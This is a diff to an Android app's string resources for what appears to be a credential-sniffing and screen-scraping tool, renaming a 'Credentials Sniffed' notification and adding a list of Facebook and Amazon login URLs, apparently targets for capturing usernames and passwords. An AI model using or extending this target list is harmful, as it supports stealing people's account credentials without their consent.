@@ -37,7 +37,7 @@
     <string name="act_clipboard_title">Clipboard History</string>
     <string name="clear">Clear</string>
     <string name="about">About</string>
-    <string name="creds_notif_title">Credentials Sniffed</string>
+    <string name="creds_notif_title">Possible Creds Sniffed</string>
     <string name="cliplist_empty">Empty clipboard history</string>
     <string name="user">User</string>
     <string name="pass">Pass</string>
@@ -57,5 +57,44 @@
     <string translatable="false" name="scrapedlist_empty">No scraped data</string>
     <string translatable="false" name="act_scraping_title">Scraped Data History</string>
     <string translatable="false" name="scrapedhistory">Scraped Data</string>
+    <string translatable="false" name="url">URL</string>
+
+    <string-array
+        translatable="false"
+        name="login_urls">
+        <item
+            >https://www.facebook.com</item>
+        <item
+            >https://it-it.facebook.com</item>
+        <item
+            >https://en.gb.facebook.com</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.facebook.com%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.facebook.com%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.facebook.com%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.google.com%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.com%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.google.com.au%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.google.co.nz%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.co.nz%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.google.co.uk%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.co.uk%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.google.it%2F&amp;_rdr</item>
+        <item
+            >https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.it%2F&amp;_rdr</item>
+
+        <item
+            >https://www.amazon.com/ap/signin/191-4856266-1058066?_encoding=UTF8&amp;openid.assoc_handle=usflex&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.mode=checkid_setup&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin</item>
+    </string-array>
 
 </resources>
